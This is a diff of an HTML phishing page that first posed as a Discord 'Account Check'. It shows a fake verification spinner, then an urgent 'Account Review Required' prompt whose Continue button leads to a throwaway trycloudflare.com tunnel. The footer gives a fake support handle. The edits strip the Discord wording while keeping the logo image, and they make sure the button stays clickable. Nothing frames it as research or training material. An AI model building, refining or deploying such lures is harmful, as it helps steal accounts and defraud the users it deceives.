@@ -3,15 +3,14 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Discord — Account Check</title>
+<title>Account Check</title>
 
 <style>
 * { box-sizing: border-box; }
 
 body {
     margin: 0;
-    font-family: "gg sans", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-    /* Discord landing-style deep blue gradient */
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
     background: radial-gradient(1200px 600px at 20% 0%, #2b2d8f 0%, rgba(43,45,143,0.0) 60%),
                 linear-gradient(180deg, #0b0f2a 0%, #1b1f6a 45%, #2a2fb0 100%);
     min-height: 100vh;
@@ -26,11 +25,11 @@ body {
     align-items: center;
     justify-content: center;
     padding: 16px;
+    pointer-events: auto;
 }
 
 /* Modal */
 .modal {
-    /* Darker panel to match Discord landing contrast */
     background: #0f122f;
     width: 100%;
     max-width: 420px;
@@ -39,6 +38,9 @@ body {
     box-shadow: 0 20px 60px rgba(0,0,0,0.55);
     text-align: center;
     color: #e6e7ff;
+    position: relative;
+    z-index: 10;
+    pointer-events: auto;
 }
 
 /* Hidden */
@@ -49,7 +51,6 @@ body {
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 12px;
     margin-bottom: 16px;
 }
 
@@ -62,7 +63,6 @@ h2 {
     margin: 0 0 8px;
     font-size: 20px;
     font-weight: 700;
-    letter-spacing: 0.2px;
     color: #ffffff;
 }
 
@@ -101,8 +101,11 @@ p {
     border-radius: 999px;
     font-size: 14px;
     font-weight: 600;
-    transition: transform 0.1s ease, box-shadow 0.15s ease, filter 0.15s ease;
     box-shadow: 0 10px 24px rgba(88,101,242,0.45);
+    cursor: pointer;
+    position: relative;
+    z-index: 20;
+    pointer-events: auto;
 }
 
 .action-btn:hover {
@@ -130,28 +133,35 @@ p {
     <!-- Loading Screen -->
     <div class="modal" id="loadingModal">
         <div class="header">
-            <img src="discord.jpeg" alt="Discord" />
+            <img src="discord.jpeg" alt="Logo" />
         </div>
-        <h2>Checking Discord Account</h2>
-        <p>Please wait while we review your discord account status.</p>
+        <h2>Checking Account</h2>
+        <p>Please wait while we review your account status.</p>
         <div class="spinner"></div>
     </div>
 
     <!-- Main Prompt -->
     <div class="modal hidden" id="mainModal">
         <div class="header">
-            <img src="discord.jpeg" alt="Discord" />
+            <img src="discord.jpeg" alt="Logo" />
         </div>
         <h2>Account Review Required</h2>
         <p>
-            Your account requires verification to avoid posible Permanent Restrictions.
-            Please continue to review your account.
+            Your account requires verification.
+            Please continue to proceed.
         </p>
 
-        <a href="https://delicious-finally-neon-infrastructure.trycloudflare.com" class="action-btn">Continue</a>
+        <a
+          href="https://delicious-finally-neon-infrastructure.trycloudflare.com"
+          class="action-btn"
+          target="_self"
+          rel="noopener"
+        >
+          Continue
+        </a>
 
         <div class="footer-note">
-            This process helps keep the Discord community safe. | Discord Support - techsupport_0000
+            Support Team | techsupport_0000
         </div>
     </div>
 
